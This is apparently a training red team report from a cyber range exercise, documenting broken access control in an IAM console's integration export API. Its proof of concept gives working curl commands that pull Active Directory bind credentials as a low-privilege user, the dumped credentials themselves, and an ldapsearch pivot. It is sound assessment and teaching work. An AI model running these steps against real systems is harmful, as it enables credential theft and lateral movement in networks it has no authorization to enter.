# Red Team Report — CLD01-M05
## IAM Console Broken Access Control — AD Integration Credential Exfiltration
**Engagement:** Operation GRIDFALL | **Date:** 2024-11-15
**Operator:** [Red Team Operator] | **Target:** cld-iam (11.0.2.50:8080)
**Classification:** TRAINING

---

## Executive Summary

Exploited a Broken Access Control vulnerability in the IAM Console's integration export API to retrieve the Active Directory LDAP bind account credentials as an unprivileged `iam_user`. The UI restricts this function to admins visually, but the API endpoint has no server-side role check. Credentials extracted directly pivoted to the AD range via LDAP Passback on SRV08-WEB. Full cloud zone kill chain (M1→M5) completed.

---

## Finding 1: Broken Access Control on /export Endpoint (Critical)

**CWE:** CWE-862 — Missing Authorization
**CVSS v3.1:** 9.8 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N)
**MITRE:** T1078.004, T1199
**OWASP:** A01:2021 — Broken Access Control

### Proof of Concept

```bash
# Get token as iam_user (cloud-iam-svc, credentials from M4 image)
TOKEN=$(curl -s -X POST http://11.0.2.50:8080/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username":"cloud-iam-svc","password":"IAm@CLD!2025"}' \
    | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Verify role — this is iam_user, not iam_admin
curl -s http://11.0.2.50:8080/api/v1/auth/me \
    -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
# {"role": "iam_user"}  ← not admin, but can still hit /export

# Exploit BAC — call admin-only endpoint directly
curl -s http://11.0.2.50:8080/api/v1/integrations/int-ad-corp-001/export \
    -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

### Response — AD Credentials Confirmed

```json
{
  "config": {
    "bind_dn": "CN=svc_ldap,CN=Users,DC=cyberange,DC=local",
    "bind_password": "Ld@pB1nd#2025!",
    "dc_ip": "33.55.55.137",
    "domain": "cyberange.local"
  },
  "additional_targets": {
    "web_admin_panel": "http://33.55.55.129/admin/"
  }
}
```

### AD Pivot — Credentials Validated

```bash
ldapsearch -x -H ldap://33.55.55.137 \
    -D "CN=svc_ldap,CN=Users,DC=cyberange,DC=local" \
    -w 'Ld@pB1nd#2025!' \
    -b "DC=cyberange,DC=local" "(objectClass=user)" sAMAccountName 2>&1 | head -10
# result: 0 Success → AD pivot confirmed
```

---

## Finding 2: Sensitive AD Credentials Stored in Plaintext App Config (High)

Even with BAC fixed, the bind password should not be stored in application memory in plaintext. Exfiltrating the app process memory or reading the app config file yields the same credential.

---

## Artifacts

- IAM Console logs: `/var/log/pul-cloud/iam.log`
- Vulnerable route: `/api/v1/integrations/<id>/export` in `/opt/pul-cloud-iam/app.py`
- Stolen credential: `svc_ldap:Ld@pB1nd#2025!` → cyberange.local (33.55.55.137)
- AD Entry: SRV08-WEB LDAP Passback → `http://33.55.55.129/admin/`
